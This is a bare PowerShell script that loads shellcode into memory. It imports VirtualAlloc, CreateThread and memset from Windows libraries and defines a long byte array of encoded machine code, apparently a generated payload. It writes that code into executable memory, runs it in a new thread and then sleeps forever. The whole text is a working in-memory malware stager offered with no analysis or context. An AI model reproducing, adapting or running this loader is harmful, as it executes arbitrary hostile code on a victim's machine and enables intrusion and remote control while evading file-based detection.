$eYbQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eYbQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xbb,0xca,0x22,0xa8,0x57,0xb1,0x47,0x83,0xc5,0x04,0x31,0x5d,0x14,0x03,0x5d,0xde,0xc0,0x5d,0xab,0x36,0x86,0x9e,0x54,0xc6,0xe7,0x17,0xb1,0xf7,0x27,0x43,0xb1,0xa7,0x97,0x07,0x97,0x4b,0x53,0x45,0x0c,0xd8,0x11,0x42,0x23,0x69,0x9f,0xb4,0x0a,0x6a,0x8c,0x85,0x0d,0xe8,0xcf,0xd9,0xed,0xd1,0x1f,0x2c,0xef,0x16,0x7d,0xdd,0xbd,0xcf,0x09,0x70,0x52,0x64,0x47,0x49,0xd9,0x36,0x49,0xc9,0x3e,0x8e,0x68,0xf8,0x90,0x85,0x32,0xda,0x13,0x4a,0x4f,0x53,0x0c,0x8f,0x6a,0x2d,0xa7,0x7b,0x00,0xac,0x61,0xb2,0xe9,0x03,0x4c,0x7b,0x18,0x5d,0x88,0xbb,0xc3,0x28,0xe0,0xb8,0x7e,0x2b,0x37,0xc3,0xa4,0xbe,0xac,0x63,0x2e,0x18,0x09,0x92,0xe3,0xff,0xda,0x98,0x48,0x8b,0x85,0xbc,0x4f,0x58,0xbe,0xb8,0xc4,0x5f,0x11,0x49,0x9e,0x7b,0xb5,0x12,0x44,0xe5,0xec,0xfe,0x2b,0x1a,0xee,0xa1,0x94,0xbe,0x64,0x4f,0xc0,0xb2,0x26,0x07,0x25,0xff,0xd8,0xd7,0x21,0x88,0xab,0xe5,0xee,0x22,0x24,0x45,0x66,0xed,0xb3,0xaa,0x5d,0x49,0x2b,0x55,0x5e,0xaa,0x65,0x91,0x0a,0xfa,0x1d,0x30,0x33,0x91,0xdd,0xbd,0xe6,0x0c,0xdb,0x29,0xc9,0x79,0xe2,0xc3,0xa1,0x7b,0xe5,0x12,0x89,0xf5,0x03,0x44,0xbd,0x55,0x9c,0x24,0x6d,0x16,0x4c,0xcc,0x67,0x99,0xb3,0xec,0x87,0x73,0xdc,0x86,0x67,0x2a,0xb4,0x3e,0x11,0x77,0x4e,0xdf,0xde,0xad,0x2a,0xdf,0x55,0x42,0xca,0x91,0x9d,0x2f,0xd8,0x45,0x6e,0x7a,0x82,0xc3,0x71,0x50,0xa9,0xeb,0xe7,0x5f,0x78,0xbc,0x9f,0x5d,0x5d,0x8a,0x3f,0x9d,0x88,0x81,0xf6,0x0b,0x73,0xfd,0xf6,0xdb,0x73,0xfd,0xa0,0xb1,0x73,0x95,0x14,0xe2,0x27,0x80,0x5a,0x3f,0x54,0x19,0xcf,0xc0,0x0d,0xce,0x58,0xa9,0xb3,0x29,0xae,0x76,0x4b,0x1c,0x2e,0x4a,0x9a,0x58,0x44,0xa2,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uwQ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uwQ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uwQ,0,0,0);for (;;){Start-sleep 60};